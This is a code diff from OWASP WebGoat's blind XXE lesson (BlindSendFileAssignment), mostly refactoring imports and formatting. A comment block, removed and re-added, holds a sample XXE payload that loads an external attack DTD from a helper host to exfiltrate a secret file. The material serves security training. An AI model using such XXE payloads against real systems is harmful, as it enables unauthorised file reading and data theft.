@@ -1,19 +1,21 @@
 package org.owasp.webgoat.xxe;
 
-import com.google.common.base.Charsets;
-import com.google.common.io.Files;
 import lombok.SneakyThrows;
 import org.owasp.webgoat.assignments.AssignmentEndpoint;
 import org.owasp.webgoat.assignments.AssignmentHints;
-import org.owasp.webgoat.assignments.AssignmentPath;
 import org.owasp.webgoat.assignments.AttackResult;
 import org.springframework.beans.factory.annotation.Autowired;
 import org.springframework.beans.factory.annotation.Value;
 import org.springframework.http.MediaType;
-import org.springframework.web.bind.annotation.*;
+import org.springframework.web.bind.annotation.PostMapping;
+import org.springframework.web.bind.annotation.RequestBody;
+import org.springframework.web.bind.annotation.ResponseBody;
+import org.springframework.web.bind.annotation.RestController;
 
 import javax.annotation.PostConstruct;
 import java.io.File;
+import java.nio.charset.StandardCharsets;
+import java.nio.file.Files;
 
 import static org.apache.commons.lang3.RandomStringUtils.randomAlphabetic;
 
@@ -47,7 +49,7 @@ import static org.apache.commons.lang3.RandomStringUtils.randomAlphabetic;
  * @since November 18, 2016
  */
 @RestController
-@AssignmentHints({"xxe.blind.hints.1","xxe.blind.hints.2","xxe.blind.hints.3","xxe.blind.hints.4","xxe.blind.hints.5"})
+@AssignmentHints({"xxe.blind.hints.1", "xxe.blind.hints.2", "xxe.blind.hints.3", "xxe.blind.hints.4", "xxe.blind.hints.5"})
 public class BlindSendFileAssignment extends AssignmentEndpoint {
 
     static final String CONTENTS = "WebGoat 8.0 rocks... (" + randomAlphabetic(10) + ")";
@@ -63,7 +65,7 @@ public class BlindSendFileAssignment extends AssignmentEndpoint {
         if (!targetDirectory.exists()) {
             targetDirectory.mkdir();
         }
-        Files.write(CONTENTS, new File(targetDirectory, "secret.txt"), Charsets.UTF_8);
+        Files.writeString(new File(targetDirectory, "secret.txt").toPath(), CONTENTS, StandardCharsets.UTF_8);
     }
 
     @PostMapping(path = "xxe/blind", consumes = MediaType.ALL_VALUE, produces = MediaType.APPLICATION_JSON_VALUE)
@@ -84,13 +86,13 @@ public class BlindSendFileAssignment extends AssignmentEndpoint {
     }
 
 /**
-<?xml version="1.0"?>
-<!DOCTYPE comment [
-<!ENTITY % remote SYSTEM "http://localhost:9090/files/admin2/attack.dtd">
-%remote;
-]>
-<comment>  <text>test&send;</text></comment>
-**/
+ <?xml version="1.0"?>
+ <!DOCTYPE comment [
+ <!ENTITY % remote SYSTEM "http://localhost:9090/files/admin2/attack.dtd">
+ %remote;
+ ]>
+ <comment>  <text>test&send;</text></comment>
+ **/
     /**
      * Solution:
      *
